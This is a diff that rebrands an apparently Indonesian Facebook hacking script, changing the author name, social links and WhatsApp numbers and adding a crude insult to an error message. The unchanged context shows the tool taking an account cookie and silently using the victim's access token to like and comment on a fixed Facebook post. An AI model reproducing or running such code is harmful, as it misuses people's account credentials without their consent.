@@ -1,5 +1,5 @@
-#CODING BY UTF-8
-#MALIK XD
+#CODING BY RizzWangsaff
+#Rizzwangsaff
 #LAGI SAD ;)
 
 import os, sys, time, re, json, requests, bs4, random, calendar, datetime,subprocess, logging
@@ -75,9 +75,9 @@ _______  ______ _______ _______ _     _ _______  ______
 |       |_____/ |_____| |       |____/  |______ |_____/
 |_____  |    \_ |     | |_____  |    \_ |______ |    \_
 ───────────────────────────────────────────────────────
- [\x1b[1;96m+%s] Author   : MALIK XD
+ [\x1b[1;96m+%s] Author   : RizzWangsaff
  [\x1b[1;96m+%s] Github   : -
- [\x1b[1;96m+%s] Facebook : https://www.facebook.com/reza.inara
+ [\x1b[1;96m+%s] Facebook : -
 ───────────────────────────────────────────────────────\n'''%(N,N,N,N))
 
 class login:
@@ -97,13 +97,13 @@ class login:
 				print('\n [%s+%s] Login berhasil %s'%(H,N,cc))
 				self.bot()
 			except KeyError:
-				jalan(' [%s!%s] cokie  error coba ganti akun tumbal!'%(M,N))
+				jalan(' [%s!%s] cokie  error coba ganti akun tumbal memek!'%(M,N))
 				self.takon()
 	def takon(self):
 		takon = input('\n %s[%s!%s] Mau tau cara ambil cokie y/t: '%(N,O,N))
 		if takon in ['y','Y','iya']:
 			jalan('\n %s[%s!%s] Kamu akan di arahkan ke Ke Wa Untuk Donasi'%(N,O,N))
-			os.system('xdg-open wa.me/6282283778755');exit()
+			os.system('xdg-open wa.me/6285850942589');exit()
 		else:
 			login().__login__()
 	def bot(self):
@@ -119,7 +119,7 @@ class login:
 		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
 		requests.post('https://graph.facebook.com/3086614624895671/comments/?message='+komen+'&access_token=' + toket)
 		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
-		os.system('xdg-open wa.me/6282283778755')
+		os.system('xdg-open wa.me/6285850942589')
 		menu().main()
 
 class menu:
@@ -359,7 +359,7 @@ class menu:
 		elif usna in ['U','u']:
 			nom_wa ='+6285929340724'
 			kata = input(' %s [%s!%s] Masukan pesan kamu ke admin : %s'%(N,O,N,H))
-			url_wa = ("https://api.whatsapp.com/+6282283778755?phone="+nom_wa+"&text="+kata)
+			url_wa = ("https://api.whatsapp.com/+6285850942589?phone="+nom_wa+"&text="+kata)
 			subprocess.check_output(["am", "start", url_wa])
 			exit()
 		else:
